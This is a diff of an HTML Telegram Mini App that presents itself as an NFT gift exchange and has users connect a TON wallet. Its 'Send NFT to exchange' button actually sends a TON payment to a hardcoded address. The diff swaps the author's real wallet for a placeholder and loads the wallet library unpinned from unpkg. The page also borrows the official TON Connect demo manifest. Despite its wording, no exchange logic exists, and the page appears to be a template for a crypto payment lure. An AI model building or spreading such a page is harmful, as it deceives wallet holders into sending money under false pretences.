@@ -4,10 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>NFT Exchange Mini App</title>
-    <!-- Подключаем Telegram Web Apps API -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <!-- Подключаем TON Connect UI из твоего же репозитория -->
-    <script src="tonconnect-ui.min.js"></script>
+    <!-- Подключаем скрипт нового поколения (модуль) -->
+    <script type="module">
+        import 'https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js';
+    </script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -35,12 +36,6 @@
             width: 80%;
             max-width: 300px;
         }
-        #error-log {
-            color: #ff6b6b;
-            font-size: 12px;
-            margin-top: 20px;
-            word-break: break-all;
-        }
     </style>
 </head>
 <body>
@@ -48,37 +43,24 @@
     <h2>🔄 Обмен NFT Подарков</h2>
     <p>Подключите кошелек для автоматического подтверждения сделки</p>
 
-    <!-- Контейнер для кнопки подключения кошелька -->
+    <!-- Кнопка создается автоматически внутри этого тега -->
     <div id="ton-connect-btn"></div>
 
     <button id="send-nft-btn" class="btn-send">Отправить NFT на обмен</button>
     
-    <div id="error-log"></div>
+    <div id="error-log" style="color: #ff6b6b; font-size: 12px; margin-top: 20px;"></div>
 
-    <script>
-        // Инициализация Telegram Web App
-        try {
-            if (window.Telegram && window.Telegram.WebApp) {
-                window.Telegram.WebApp.ready();
-                window.Telegram.WebApp.expand();
-            }
-        } catch (e) {
-            console.error(e);
-        }
-
-        // Ждем загрузки страницы
-        window.addEventListener('load', () => {
-            let tonConnectUI;
-
+    <script type="module">
+        // Ждем пока модуль импортирует класс в глобальную область
+        window.addEventListener('load', async () => {
             try {
-                // Проверяем наличие библиотеки в объекте window
-                const TONUI = window.TONConnectUI || (window.TonConnectUI && window.TonConnectUI.TonConnectUI);
-                
-                if (!TONUI) {
-                    throw new Error("Библиотека TONConnectUI не обнаружена в системе.");
+                if (window.Telegram && window.Telegram.WebApp) {
+                    window.Telegram.WebApp.ready();
+                    window.Telegram.WebApp.expand();
                 }
 
-                tonConnectUI = new TONUI({
+                // Создаем подключение
+                const tonConnectUI = new TONConnectUI.TonConnectUI({
                     manifestUrl: 'https://raw.githubusercontent.com/ton-connect/demo-dapp/main/public/tonconnect-manifest.json',
                     buttonRootId: 'ton-connect-btn'
                 });
@@ -98,24 +80,23 @@
                         validUntil: Math.floor(Date.now() / 1000) + 60,
                         messages: [
                             {
-                                // Твой реальный TON-кошелек, полученный из @wallet или @tonkeeperbot:
-                                address: "UQB1T3VLoL9Cx2MzVdLte1A_jAN8BpAieopmkSJwvXKf0l3-",
+                                // ВСТАВЬ СЮДА СВОЙ АДРЕС ТОН-КОШЕЛЬКА:
+                                address: "EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c",
                                 amount: "10000000" 
                             }
                         ]
                     };
-
                     try {
                         await tonConnectUI.sendTransaction(transaction);
                         alert("Успешно!");
                         if (window.Telegram && window.Telegram.WebApp) window.Telegram.WebApp.close();
                     } catch (e) {
-                        alert("Ошибка транзакции или отмена.");
+                        alert("Ошибка транзакции.");
                     }
                 });
 
-            } catch (error) {
-                document.getElementById('error-log').innerText = "Ошибка запуска: " + error.message;
+            } catch (err) {
+                document.getElementById('error-log').innerText = "Ошибка: " + err.message;
             }
         });
     </script>
